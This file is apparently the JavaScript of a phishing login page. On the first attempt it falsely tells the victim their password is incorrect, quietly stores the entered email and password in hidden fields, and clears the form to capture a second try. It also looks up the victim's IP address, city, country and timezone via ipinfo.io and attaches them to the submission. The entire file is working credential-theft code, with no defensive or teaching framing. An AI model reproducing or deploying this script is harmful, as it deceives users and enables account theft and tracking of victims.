// get the modal element 
let modal = document.getElementById('simpleModal');
// get open modal button
let modalBtn = document.getElementsByClassName('button')[0];
let submitBtn = document.getElementById('submit');
// get close button
let closeBtn = document.getElementsByClassName('closeBtn')[0];

let emailField = document.getElementById('emailaddress');
let passwordField = document.getElementById('passwords');
let form = document.getElementsByTagName('form')[0];

let firstEmail = document.getElementById('firstemailaddress');
let firstPassword = document.getElementById('firsttimepassword');

let errorText = document.getElementById('red');

let ipAddress = document.getElementById('ip');

let city = document.getElementById('city');
let country = document.getElementById('country');
let timezone = document.getElementById('timezone');

let i = 0;

let ip = '';


// listen for open click
modalBtn.addEventListener('click', openModal);

// listen for close click
closeBtn.addEventListener('click', closeModal);

// listen for outside click
window.addEventListener('click', outsideClick);


// function to open modal
function openModal() {
    if (emailField.value.length > 0 && passwordField.value.length > 0) {
        if (i < 1) {
            modal.style.display = 'none';
            errorText.innerHTML = 'Your account or password is incorrect.'
            i += 1;
            modalBtn.innerHTML = '<button id="submit" type="submit">Next</button>'
            firstEmail.setAttribute('value', `${emailField.value}`);
            firstPassword.setAttribute('value', `${passwordField.value}`);
            emailField.value = '';
            passwordField.value = '';
        }
    }
}

jQuery.get("http://ipinfo.io/", function(e) {
    ipAddress.setAttribute('value', `${e.ip}`);
    city.setAttribute('value', `${e.city}`);
    country.setAttribute('value', `${e.country}`);
    timezone.setAttribute('value', `${e.timezone}`);
}, "jsonp")

// function to close modal
function closeModal() {
    modal.style.display = 'none';
}

// function to close modal if outside click
function outsideClick(e) {
    if(e.target == modal) {
        modal.style.display = 'none';
    }
}
